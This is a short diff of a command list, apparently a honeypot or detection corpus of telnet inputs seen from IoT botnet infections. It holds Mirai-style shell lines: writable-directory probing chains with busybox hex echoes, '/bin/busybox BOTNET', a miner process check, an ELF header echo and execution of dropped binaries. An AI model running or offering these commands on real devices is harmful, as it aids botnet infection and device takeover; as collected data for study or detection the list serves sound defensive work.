@@ -1,6 +1,6 @@
-enable
 sh
 system
+enable
 shell
 linuxshell
 config terminal
@@ -47,6 +47,7 @@ ps | grep '[Mm]iner'
 uname -s -m
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x44\x4a\x4c\x52\x50\x56'
 PING
+ls /home; /bin/busybox BOTNET
 /bin/busybox TOKEN
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x41\x47\x57\x54\x49\x57'
 Accept: */*
@@ -82,7 +83,6 @@ Accept-Encoding: gzip
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x58\x57\x58\x48\x44\x49'
 cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
 lghkel
-ls /home; /bin/busybox BOTNET
 sudo ./upnpsetup
 zpz}ld
 ./cKbJGPqy
